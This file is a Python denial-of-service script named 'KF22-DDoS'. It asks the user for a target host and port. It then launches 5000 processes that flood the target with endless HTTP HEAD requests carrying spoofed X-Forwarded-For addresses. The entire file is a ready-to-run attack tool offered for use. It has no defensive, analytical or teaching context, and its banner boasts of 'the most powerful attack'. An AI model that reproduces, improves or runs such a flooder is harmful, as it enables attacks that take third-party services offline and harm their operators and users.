#!/usr/bin/env python3
import os
import logging
import threading
import random
import socket
import time
import multiprocessing
import time
import fade
import requests
import sys

os.system("Clear")
logo = """
         ÷÷      ÷÷  ÷÷ ÷÷ ÷÷        ÷÷ ÷÷           ÷÷
         ÷÷    ÷÷    ÷÷            ÷÷     ÷÷       ÷÷
         ÷÷  ÷÷      ÷÷                   ÷÷     ÷÷  ÷÷
         ÷÷ ÷÷       ÷÷ ÷÷ ÷÷           ÷÷     ÷÷    ÷÷
         ÷÷  ÷÷      ÷÷               ÷÷      ÷÷ ÷÷  ÷÷
         ÷÷    ÷÷    ÷÷             ÷÷               ÷÷
         ÷÷      ÷÷  ÷÷            ÷÷ ÷÷ ÷÷          ÷÷
_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_             
_—\033[32m                THIS SCRIPT IS A DEDICATION                 _—
_—\033[33m           TO THE STABILIZATION OF THE MARTYRS              _—
_—\033[34m                     design by: KunF24                      _—
_—\033[35m                         ——oO0Oo——                          _—
_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
"""
faded_text = fade.fire(logo)
print(faded_text)
print("\033[32mWelcome to KF22-DDoS\033[0m")
ip = input("\033[36mIP/Domain: \033[0m")
port = int(input("\033[34mPort: \033[0m"))

url = "\033[33mhttp://\033[0m" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[>>>] Starting the attack [<<<]")


time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

send2attack() #61 lines for the most powerful attack, cool?

             
